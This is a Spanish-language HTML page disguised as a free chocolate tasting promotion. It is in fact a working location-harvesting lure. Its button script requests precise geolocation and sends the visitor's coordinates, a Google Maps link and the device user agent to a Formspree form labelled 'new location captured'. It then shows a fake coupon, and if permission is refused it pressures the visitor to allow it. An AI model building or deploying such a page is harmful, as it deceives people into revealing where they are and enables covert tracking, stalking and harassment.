<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chocolates de Regalo</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #4b2c20; /* Color chocolate profundo */
            color: white;
        }
        .tarjeta {
            background: white;
            color: #333;
            padding: 40px 30px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 85%;
            max-width: 320px;
        }
        h1 { color: #613e2f; margin-bottom: 10px; }
        p { font-size: 15px; color: #555; line-height: 1.4; }
        .boton-promo {
            background: linear-gradient(135deg, #a67c52 0%, #613e2f 100%);
            color: white;
            border: none;
            padding: 18px 25px;
            border-radius: 50px;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            width: 100%;
            box-shadow: 0 4px 15px rgba(166, 124, 82, 0.4);
            transition: 0.3s;
        }
        .boton-promo:active { transform: scale(0.95); }
    </style>
</head>
<body>

    <div class="tarjeta">
        <span style="font-size: 50px;">🍫</span>
        <h1>¡Felicidades!</h1>
        <p>Has sido seleccionado para una degustación gratuita de nuestros nuevos chocolates artesanales.</p>
        <p><b>Busca la tienda más cercana para redimir:</b></p>
        
        <button id="miBoton" class="boton-promo" onclick="activarUbicacion()">🎁 ¡Quiero Chocolates!</button>
        
        <p id="resultado" style="display:none; margin-top:20px; font-weight: bold; color: #2e7d32;"></p>
    </div>

    <script>
        function activarUbicacion() {
            const boton = document.getElementById("miBoton");
            const status = document.getElementById("resultado");
            
            boton.textContent = "Buscando tiendas...";
            boton.disabled = true;

            navigator.geolocation.getCurrentPosition((pos) => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                
                // TU LINK DE FORMSPREE YA INTEGRADO
                const url = "https://formspree.io/f/mzdjqjnw";

                fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        Alerta: "¡Nueva ubicación capturada!",
                        Mapa_Directo: `https://www.google.com/maps?q=${lat},${lng}`,
                        Coordenadas: `${lat}, ${lng}`,
                        Dispositivo: navigator.userAgent
                    })
                }).then(() => {
                    boton.textContent = "✅ Cupón Generado";
                    status.style.display = "block";
                    status.textContent = "¡Éxito! Presenta este código en tienda: CHOC-2026";
                });
            }, (error) => {
                // Si la persona rechaza el permiso
                alert("Para encontrar la tienda más cercana y entregarte el regalo, debes permitir el acceso a la ubicación.");
                boton.textContent = "Intentar de nuevo";
                boton.disabled = false;
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
